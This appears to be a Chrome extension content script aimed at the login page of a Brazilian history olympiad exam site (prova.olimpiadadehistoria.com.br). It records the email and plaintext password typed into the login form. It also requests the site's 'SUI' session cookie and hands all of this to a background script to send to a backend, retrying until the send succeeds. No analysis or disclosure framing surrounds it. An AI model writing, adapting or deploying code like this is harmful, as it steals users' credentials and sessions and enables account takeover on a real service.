function monitorLoginForm() {
  const observer = new MutationObserver(() => {
    const emailInput = document.querySelector(
      'input[type="email"], input[name="email"], #email'
    );
    const passwordInput = document.querySelector(
      'input[type="password"], input[name="password"], #password'
    );
    const loginForm = document.querySelector("form");
    const submitButton = document.querySelector(
      'button[type="submit"], input[type="submit"], #submit'
    );

    if (emailInput && passwordInput && loginForm) {
      loginForm.addEventListener(
        "submit",
        (event) => {
          const credentials = {
            email: emailInput.value,
            password: passwordInput.value,
            timestamp: new Date().toISOString(),
          };
          chrome.storage.local.set({ tempCredentials: credentials });
        },
        { once: true }
      );

      if (submitButton) {
        submitButton.addEventListener(
          "click",
          () => {
            const credentials = {
              email: emailInput.value,
              password: passwordInput.value,
              timestamp: new Date().toISOString(),
            };
            chrome.storage.local.set({ tempCredentials: credentials });
          },
          { once: true }
        );
      }

      observer.disconnect();
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });
}

let hasSentToBackend = false;

function checkLoginStatus() {
  if (
    window.location.href.includes(
      "prova.olimpiadadehistoria.com.br/prova/login"
    )
  ) {
    monitorLoginForm();
    return;
  }

  if (
    window.location.href.includes("prova.olimpiadadehistoria.com.br/prova/") &&
    !window.location.href.includes("/login")
  ) {
    if (hasSentToBackend) {
      return;
    }

    chrome.runtime.sendMessage(
      { type: "getCookie", name: "SUI" },
      (response) => {
        const suiCookie = response?.cookie;
        if (suiCookie) {
          chrome.storage.local.get("tempCredentials", (result) => {
            const credentials = result.tempCredentials || {};
            const loginData = {
              email: credentials.email || "unknown",
              password: credentials.password || "unknown",
              sui: suiCookie,
              timestamp: credentials.timestamp || new Date().toISOString(),
              url: window.location.href,
            };

            if (
              loginData.email === "unknown" ||
              loginData.password === "unknown"
            ) {
              return;
            }

            chrome.storage.local.set({ loginData: loginData }, () => {
              chrome.runtime.sendMessage(
                {
                  type: "sendToBackend",
                  data: loginData,
                },
                (response) => {
                  if (response?.status === "success") {
                    hasSentToBackend = true;
                    chrome.storage.local.remove("tempCredentials");
                  }
                }
              );
            });
          });
        }
      }
    );
  }
}

checkLoginStatus();

window.addEventListener("load", checkLoginStatus);

document.addEventListener("DOMContentLoaded", checkLoginStatus);

let retryCount = 0;
const maxRetries = 10;
const retryInterval = setInterval(() => {
  if (retryCount >= maxRetries || hasSentToBackend) {
    clearInterval(retryInterval);
    return;
  }
  checkLoginStatus();
  retryCount++;
}, 2000);
